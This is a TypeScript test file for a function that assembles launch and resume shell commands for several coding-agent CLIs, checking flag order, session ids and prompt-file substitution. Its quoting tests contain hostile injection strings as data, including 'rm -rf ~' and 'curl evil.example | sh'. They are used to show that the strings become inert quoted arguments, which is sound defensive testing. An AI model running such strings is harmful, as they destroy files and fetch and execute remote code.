import { afterEach, describe, expect, it } from 'vitest'
import { assembleLaunchCommand, assembleResumeCommand, promptFilePathError } from './launch'
import { setCustomAgentBaseResolver } from './config'
import type { CustomAgent } from '../types'

const ENV = { MY_MODEL: 'sonnet', MY_TOKEN: 'sk-abc' }

const claudeProxy: CustomAgent = {
  id: 'custom:proxy',
  label: 'Claude (proxy)',
  launchCmd: 'claude-wopr',
  baseAgent: 'claude',
  args: '--model ${env:MY_MODEL}'
}
const aider: CustomAgent = {
  id: 'custom:aider',
  label: 'Aider',
  launchCmd: 'aider',
  promptInjectionMode: 'argv'
}

afterEach(() => setCustomAgentBaseResolver(null))

describe('assembleLaunchCommand — builtins (byte-identical to the historical path)', () => {
  it('claude bare', () => {
    expect(assembleLaunchCommand({ agentId: 'claude' }, ENV).command).toBe('claude')
  })
  it("claude with a prompt", () => {
    expect(assembleLaunchCommand({ agentId: 'claude', initialPrompt: 'fix the bug' }, ENV).command).toBe(
      "claude 'fix the bug'"
    )
  })
  it('claude with prompt + permission mode + minted session id', () => {
    expect(
      assembleLaunchCommand(
        { agentId: 'claude', initialPrompt: 'fix', permissionMode: 'auto', sessionId: 'abc-123', sessionIdFlagSupported: true },
        ENV
      ).command
    ).toBe("claude 'fix' --permission-mode auto --session-id abc-123")
  })
  it('claude omits --session-id when the CLI does not support it', () => {
    expect(
      assembleLaunchCommand(
        { agentId: 'claude', sessionId: 'abc-123', sessionIdFlagSupported: false },
        ENV
      ).command
    ).toBe('claude')
  })
  it('grok puts the MINTED SESSION ID before the -- separator, prompt and all', () => {
    // The failure this guards is not a crash. grok's `--` is END OF OPTIONS: a flag placed after it
    // is swallowed as part of the PROMPT, so the node launches, looks healthy, mints a session id
    // nodeterm never learns, and the agent reads "--session-id <uuid>" as the first words of its
    // instructions. Nothing about the exit code says so — which is why this asserts on POSITION.
    const cmd = assembleLaunchCommand(
      {
        agentId: 'grok',
        initialPrompt: 'do the thing',
        sessionId: '01a06126-b981-73f1-8b68-4547e4d7da84',
        sessionIdFlagSupported: true
      },
      ENV
    ).command
    expect(cmd).toBe(
      "grok --session-id 01a06126-b981-73f1-8b68-4547e4d7da84 -- 'do the thing'"
    )
    expect(cmd.indexOf('--session-id')).toBeLessThan(cmd.indexOf(' -- '))
  })

  it('mints nothing for grok when the CLI did not advertise the flag', () => {
    // The probe answers for the binary in front of us. No advertisement ⇒ NAKED command, never a
    // blocked launch: an unrecognised flag makes grok exit, so guessing costs the whole session.
    expect(
      assembleLaunchCommand(
        { agentId: 'grok', sessionId: '01a06126-b981-73f1-8b68-4547e4d7da84' },
        ENV
      ).command
    ).toBe('grok')
  })

  it('devin puts the prompt BEHIND a -- separator and the permission flag BEFORE it', () => {
    expect(
      assembleLaunchCommand({ agentId: 'devin', initialPrompt: 'version', permissionMode: 'acceptEdits' }, ENV).command
    ).toBe("devin --permission-mode accept-edits -- 'version'")
  })
  it('devin adds a --model flag before the prompt separator', () => {
    expect(
      assembleLaunchCommand(
        { agentId: 'devin', initialPrompt: 'version', permissionMode: 'acceptEdits', model: 'claude-sonnet-4' },
        ENV
      ).command
    ).toBe("devin --permission-mode accept-edits --model 'claude-sonnet-4' -- 'version'")
  })
  it('grok puts the permission flag BEFORE the -- separator', () => {
    expect(
      assembleLaunchCommand({ agentId: 'grok', initialPrompt: 'version', permissionMode: 'plan' }, ENV).command
    ).toBe("grok --permission-mode plan -- 'version'")
  })
  it('opencode uses --prompt (flag-prompt mode)', () => {
    expect(
      assembleLaunchCommand({ agentId: 'opencode', initialPrompt: 'fix it' }, ENV).command
    ).toBe("opencode --prompt 'fix it'")
  })
  it('Copilot keeps an initial prompt interactive', () => {
    expect(
      assembleLaunchCommand(
        {
          agentId: 'copilot',
          initialPrompt: 'fix it',
          sessionId: 'abc-123',
          sessionIdFlagSupported: true
        },
        ENV
      ).command
    ).toBe("copilot --interactive 'fix it' --session-id=abc-123")
  })
  it('adds a safely quoted model override after the ordinary Claude launch flags', () => {
    expect(
      assembleLaunchCommand(
        {
          agentId: 'claude',
          initialPrompt: 'fix',
          permissionMode: 'plan',
          model: 'anthropic/claude-sonnet-4'
        },
        ENV
      ).command
    ).toBe("claude 'fix' --permission-mode plan --model 'anthropic/claude-sonnet-4'")
  })
})

describe('assembleResumeCommand — Copilot', () => {
  it('uses Copilot resume grammar while leaving a gateway model to the environment', () => {
    expect(
      assembleResumeCommand(
        { agentId: 'copilot', sessionId: 'abc-123', model: 'openai/gpt-5.5' },
        ENV
      ).command
    ).toBe('copilot --resume=abc-123')
  })
})

describe('assembleLaunchCommand — custom agents', () => {
  it('a vanilla custom agent launches with its command + prompt', () => {
    expect(
      assembleLaunchCommand({ agentId: 'custom:aider', customAgent: aider, initialPrompt: 'hi' }, ENV).command
    ).toBe("aider 'hi'")
  })
  it('a claude-base proxy inherits the claude command grammar + flags', () => {
    setCustomAgentBaseResolver((id) => (id === 'custom:proxy' ? 'claude' : undefined))
    const r = assembleLaunchCommand(
      { agentId: 'custom:proxy', customAgent: claudeProxy, initialPrompt: 'fix', permissionMode: 'auto', sessionId: 's1', sessionIdFlagSupported: true },
      ENV
    )
    // args are expanded + each token quoted; flags appended like claude.
    expect(r.command).toBe("claude-wopr '--model' 'sonnet' 'fix' --permission-mode auto --session-id s1")
    expect(r.missingEnv).toEqual([])
  })
  it('a claude-base agent with a stale flag-prompt emits a POSITIONAL, not --prompt', () => {
    // Regression: a custom agent with baseAgent:'claude' + a stale promptInjectionMode:'flag-prompt'
    // must NOT emit `--prompt` (claude rejects it). The harness's argv grammar wins.
    setCustomAgentBaseResolver((id) => (id === 'custom:stale' ? 'claude' : undefined))
    const stale: CustomAgent = {
      id: 'custom:stale',
      label: 'Stale',
      launchCmd: 'claude-wopr',
      baseAgent: 'claude',
      promptInjectionMode: 'flag-prompt'
    }
    const r = assembleLaunchCommand(
      { agentId: 'custom:stale', customAgent: stale, initialPrompt: 'read the handoff file' },
      ENV
    )
    expect(r.command).toContain("'read the handoff file'")
    expect(r.command).not.toContain('--prompt')
  })
  it('a base-agent proxy inherits model-switch command grammar', () => {
    setCustomAgentBaseResolver((id) => (id === 'custom:proxy' ? 'claude' : undefined))
    expect(
      assembleLaunchCommand(
        {
          agentId: 'custom:proxy',
          customAgent: { ...claudeProxy, args: '' },
          model: 'anthropic/claude-opus'
        },
        ENV
      ).command
    ).toBe("claude-wopr --model 'anthropic/claude-opus'")
  })
  it('expands ${env:…} in args and reports missing vars', () => {
    setCustomAgentBaseResolver((id) => (id === 'custom:proxy' ? 'claude' : undefined))
    const r = assembleLaunchCommand(
      { agentId: 'custom:proxy', customAgent: { ...claudeProxy, args: '--model ${env:UNSET}' } },
      {}
    )
    expect(r.missingEnv).toEqual(['UNSET'])
  })
  it('a blank launchCmd with a baseAgent uses the base harness command', () => {
    setCustomAgentBaseResolver((id) => (id === 'custom:blank' ? 'claude' : undefined))
    const blank: CustomAgent = { id: 'custom:blank', label: 'B', launchCmd: '', baseAgent: 'claude' }
    expect(assembleLaunchCommand({ agentId: 'custom:blank', customAgent: blank }, ENV).command).toBe('claude')
  })
})

describe('assembleResumeCommand', () => {
  it('claude resumes with --resume', () => {
    expect(assembleResumeCommand({ agentId: 'claude', sessionId: 'abc-123' }, ENV).command).toBe(
      'claude --resume abc-123'
    )
  })
  it('devin resumes with --resume <sid>', () => {
    expect(assembleResumeCommand({ agentId: 'devin', sessionId: 'abc-123' }, ENV).command).toBe(
      'devin --resume abc-123'
    )
  })
  it('codex resumes with the subcommand form', () => {
    expect(assembleResumeCommand({ agentId: 'codex', sessionId: 'abc-123' }, ENV).command).toBe(
      'codex resume abc-123'
    )
  })
  it('puts the model flag in the measured Codex resume grammar', () => {
    expect(
      assembleResumeCommand(
        { agentId: 'codex', sessionId: 'abc-123', model: 'openai/gpt-5' },
        ENV
      ).command
    ).toBe("codex resume abc-123 --model 'openai/gpt-5'")
  })
  it('falls back to the bare launch command when there is no session id', () => {
    expect(assembleResumeCommand({ agentId: 'claude' }, ENV).command).toBe('claude')
  })
  it('a claude-base proxy resumes with its own binary + claude grammar + args', () => {
    setCustomAgentBaseResolver((id) => (id === 'custom:proxy' ? 'claude' : undefined))
    expect(
      assembleResumeCommand(
        { agentId: 'custom:proxy', customAgent: claudeProxy, sessionId: 'abc-123', permissionMode: 'plan' },
        ENV
      ).command
    ).toBe("claude-wopr '--model' 'sonnet' --resume abc-123 --permission-mode plan")
  })
  it('a non-resumable vanilla custom agent falls back to its bare launch command', () => {
    expect(
      assembleResumeCommand({ agentId: 'custom:aider', customAgent: aider }, ENV).command
    ).toBe('aider')
  })
})

describe('quoting by construction — env values can never become shell syntax or extra argv', () => {
  const proxyWith = (args: string): CustomAgent => ({
    id: 'custom:proxy',
    label: 'Proxy',
    launchCmd: 'claude-wopr',
    baseAgent: 'claude',
    args
  })

  it('a value carrying spaces stays ONE argument (the token boundary is fixed before expansion)', () => {
    const { command } = assembleLaunchCommand(
      { agentId: 'custom:aider', customAgent: proxyWith('--model ${env:SPACED}') },
      { SPACED: 'two words' }
    )
    expect(command).toBe("claude-wopr '--model' 'two words'")
  })

  it('a value carrying `;`, backticks, and $() reaches the shell as ONE literal argument', () => {
    const hostile = "x; rm -rf ~; `touch /tmp/pwn`; $(id) --dangerously-skip-permissions"
    const { command } = assembleLaunchCommand(
      { agentId: 'custom:aider', customAgent: proxyWith('--model ${env:EVIL}') },
      { EVIL: hostile }
    )
    // Exactly one argv token after --model: the whole hostile string, single-quoted. Nothing in it
    // can smuggle a flag (it is one argument) or read as syntax (it is quoted).
    expect(command).toBe(`claude-wopr '--model' '${hostile}'`)
    // The byte-equality above IS the proof: the entire hostile string sits inside one pair of
    // single quotes (it contains no quote of its own to break out with), so the flag it carries
    // is data inside --model's value, not a fourth argv token.
    expect(command.endsWith("'")).toBe(true)
  })

  it('a launchCmd env value expanding to shell metacharacters is fenced into a literal', () => {
    const { command } = assembleLaunchCommand(
      {
        agentId: 'custom:aider',
        customAgent: {
          id: 'custom:aider',
          label: 'Aider',
          launchCmd: '${env:AGENT_BIN}',
          promptInjectionMode: 'argv'
        }
      },
      { AGENT_BIN: 'agent; curl evil.example | sh' }
    )
    expect(command).toBe("'agent; curl evil.example | sh'")
  })

  it('a launchCmd env value that is a plain path stays bare', () => {
    const { command } = assembleLaunchCommand(
      {
        agentId: 'custom:aider',
        customAgent: {
          id: 'custom:aider',
          label: 'Aider',
          launchCmd: '${env:AGENT_BIN} serve',
          promptInjectionMode: 'argv'
        }
      },
      { AGENT_BIN: '/opt/agents/bin/aider' }
    )
    expect(command).toBe('/opt/agents/bin/aider serve')
  })

  it('a launchCmd with no env tokens passes through byte-for-byte, raw shell text included', () => {
    const { command } = assembleLaunchCommand(
      {
        agentId: 'custom:aider',
        customAgent: {
          id: 'custom:aider',
          label: 'Aider',
          launchCmd: 'FOO=1 aider --no-git',
          promptInjectionMode: 'argv'
        }
      },
      {}
    )
    expect(command).toBe('FOO=1 aider --no-git')
  })

  it('an args token whose reference is unset vanishes and is reported missing', () => {
    const { command, missingEnv } = assembleLaunchCommand(
      { agentId: 'custom:aider', customAgent: proxyWith('--model ${env:GONE} --verbose') },
      {}
    )
    expect(command).toBe("claude-wopr '--model' '--verbose'")
    expect(missingEnv).toEqual(['GONE'])
  })
})

describe('assembleLaunchCommand — promptFile (issue #520)', () => {
  // The whole point: the TYPED line stays single-line while the pane's shell expands the file at
  // execution, so a multi-line brief reaches the CLI with its structure intact.
  it('claude composes the prompt as a "$(cat …)" substitution with the PATH single-quoted', () => {
    expect(
      assembleLaunchCommand({ agentId: 'claude', promptFile: '/tmp/brief.md' }, ENV).command
    ).toBe('claude "$(cat \'/tmp/brief.md\')"')
  })
  it('flags still land after the prompt for claude', () => {
    expect(
      assembleLaunchCommand(
        { agentId: 'claude', promptFile: '/tmp/brief.md', permissionMode: 'auto' },
        ENV
      ).command
    ).toBe('claude "$(cat \'/tmp/brief.md\')" --permission-mode auto')
  })
  it('grok keeps its flags BEFORE the -- separator, substitution after it', () => {
    expect(
      assembleLaunchCommand(
        { agentId: 'grok', promptFile: '/tmp/brief.md', permissionMode: 'plan' },
        ENV
      ).command
    ).toBe('grok --permission-mode plan -- "$(cat \'/tmp/brief.md\')"')
  })
  it('a flag-prompt agent passes the substitution through its prompt flag', () => {
    expect(assembleLaunchCommand({ agentId: 'opencode', promptFile: '/tmp/b.md' }, ENV).command).toBe(
      'opencode --prompt "$(cat \'/tmp/b.md\')"'
    )
  })
  it('promptFile wins over initialPrompt', () => {
    expect(
      assembleLaunchCommand(
        { agentId: 'claude', initialPrompt: 'ignored', promptFile: '/tmp/brief.md' },
        ENV
      ).command
    ).toBe('claude "$(cat \'/tmp/brief.md\')"')
  })
  it('a path with a quote in it cannot break out of the quoting', () => {
    // shellSingleQuote's '\'' dance — the path stays ONE argument to cat and nothing in it
    // reaches the shell as syntax.
    const cmd = assembleLaunchCommand(
      { agentId: 'claude', promptFile: "/tmp/my brief's.md" },
      ENV
    ).command
    expect(cmd.startsWith('claude "$(cat ')).toBe(true)
    expect(cmd).toContain("'/tmp/my brief'\\''s.md'")
  })
  it('the --prompt literal is still collapsed to one line (unchanged behavior)', () => {
    expect(
      assembleLaunchCommand({ agentId: 'claude', initialPrompt: 'a\nb\n\n  c' }, ENV).command
    ).toBe("claude 'a b c'")
  })
})

/**
 * Issue #601, at the layer the reporter actually read it off — the assembled command line, the one
 * that shows up in the process table. `withPermissionMode` has its own unit tests; these two pin
 * that the composition does not put the flag back.
 */
describe('assembleLaunchCommand / assembleResumeCommand — override already carries the flag (#601)', () => {
  it('does not duplicate --permission-mode on a fresh launch', () => {
    expect(
      assembleLaunchCommand(
        {
          agentId: 'claude',
          launchCmdOverride: 'claude --permission-mode bypassPermissions',
          permissionMode: 'auto'
        },
        ENV
      ).command
    ).toBe('claude --permission-mode bypassPermissions')
  })

  it('does not duplicate it on the resume path either', () => {
    // The cold-restore / restart leg. It resumes through the same wrapper, so it inherits the same
    // duplicate if this is fixed in only one assembler.
    expect(
      assembleResumeCommand(
        {
          agentId: 'claude',
          launchCmdOverride: 'claude --permission-mode=plan',
          sessionId: 'abc-123',
          permissionMode: 'auto'
        },
        ENV
      ).command
    ).toBe('claude --permission-mode=plan --resume abc-123')
  })

  it('still appends to an override that says nothing about permissions', () => {
    expect(
      assembleLaunchCommand(
        { agentId: 'claude', launchCmdOverride: 'my-wrapper', permissionMode: 'auto' },
        ENV
      ).command
    ).toBe('my-wrapper --permission-mode auto')
  })
})

describe('promptFilePathError', () => {
  it('accepts an absolute POSIX path', () => {
    expect(promptFilePathError('/tmp/brief.md')).toBeNull()
  })
  it('accepts a Windows drive path', () => {
    expect(promptFilePathError('C:\\briefs\\x.md')).toBeNull()
  })
  it('refuses a relative path', () => {
    expect(promptFilePathError('brief.md')).toMatch(/absolute/)
  })
  it('refuses an empty path', () => {
    expect(promptFilePathError('  ')).toMatch(/needs a path/)
  })
  it('refuses a newline in the path — it would break the single-line typed delivery', () => {
    expect(promptFilePathError('/tmp/a\nb')).toMatch(/newlines/)
  })
})
